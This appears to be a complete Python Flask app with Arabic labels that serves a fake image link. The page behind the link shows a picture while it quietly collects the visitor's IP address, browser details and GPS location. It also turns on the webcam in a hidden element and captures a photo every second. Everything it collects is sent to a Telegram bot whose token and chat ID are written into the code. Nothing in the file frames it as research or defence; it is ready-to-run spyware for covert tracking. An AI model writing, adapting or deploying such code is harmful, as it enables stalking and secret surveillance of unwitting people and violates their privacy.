from flask import Flask, request, send_file, make_response
from datetime import datetime
import requests
import base64

app = Flask(__name__)

BOT_TOKEN = "7144838322:AAGKviMrikld9z5Puxuk6eAu5AmSYQ2jxuQ"
CHAT_ID = "6113061454"

def send_text_to_telegram(ip, ua, gps_lat=None, gps_long=None):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    gps_text = f"\n📍 GPS: {gps_lat}, {gps_long}" if gps_lat and gps_long else ""
    message = f"""📸 تم فتح الصورة:

🕒 {now}
🌐 IP: {ip}
📱 UA: {ua}{gps_text}
"""
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  data={"chat_id": CHAT_ID, "text": message})

def send_photo_to_telegram(image_bytes):
    files = {'photo': ('photo.jpg', image_bytes)}
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                  data={"chat_id": CHAT_ID},
                  files=files)

@app.route("/img.jpg")
def fake_image_page():
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "غير معروف")

    html = f"""
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <title>تحميل صورة</title>
        <style>
            body {{ text-align: center; font-family: Arial; background: #f4f4f4; }}
            img {{ max-width: 90%; margin-top: 20px; }}
            video {{ display: none; }}
        </style>
    </head>
    <body>
        <img src="/real.jpg" alt="الصورة">
        <p>📡 جاري التشغيل السري...</p>

        <video id="video" autoplay muted playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            let video = document.getElementById("video");
            let canvas = document.getElementById("canvas");
            let ctx = canvas.getContext("2d");

            // إرسال IP و UA و GPS
            fetch("/send_gps", {{
                method: "POST",
                headers: {{
                    "Content-Type": "application/json"
                }},
                body: JSON.stringify({{
                    ip: "{ip}",
                    ua: `{ua}`
                }})
            }});

            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(function(pos) {{
                    fetch("/send_gps", {{
                        method: "POST",
                        headers: {{
                            "Content-Type": "application/json"
                        }},
                        body: JSON.stringify({{
                            ip: "{ip}",
                            ua: `{ua}`,
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude
                        }})
                    }});
                }});
            }}

            // تشغيل الكاميرا
            navigator.mediaDevices.getUserMedia({{ video: true }}).then(function(stream) {{
                video.srcObject = stream;
                video.play();

                setInterval(function() {{
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {{
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let image = canvas.toDataURL("image/jpeg");
                        fetch("/upload_photo", {{
                            method: "POST",
                            headers: {{
                                "Content-Type": "application/json"
                            }},
                            body: JSON.stringify({{ image: image }})
                        }});
                    }}
                }}, 1000); // كل ثانية

            }}).catch(function(error) {{
                console.log("فشل تشغيل الكاميرا:", error);
            }});
        </script>
    </body>
    </html>
    """
    return make_response(html)

@app.route("/send_gps", methods=["POST"])
def receive_gps():
    data = request.json
    ip = data.get("ip", request.remote_addr)
    ua = data.get("ua", request.headers.get("User-Agent", "غير معروف"))
    lat = data.get("latitude")
    lon = data.get("longitude")
    send_text_to_telegram(ip, ua, lat, lon)
    return {"status": "تم إرسال الموقع"}

@app.route("/upload_photo", methods=["POST"])
def receive_photo():
    data = request.json
    img_data = data.get("image", "")
    if img_data.startswith("data:image/jpeg;base64,"):
        img_data = img_data.replace("data:image/jpeg;base64,", "")
    try:
        image_bytes = base64.b64decode(img_data)
        send_photo_to_telegram(image_bytes)
        return {"status": "تم إرسال الصورة"}
    except Exception as e:
        return {"status": "فشل", "error": str(e)}

@app.route("/real.jpg")
def serve_real_image():
    return send_file("real.jpg", mimetype="image/jpeg")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)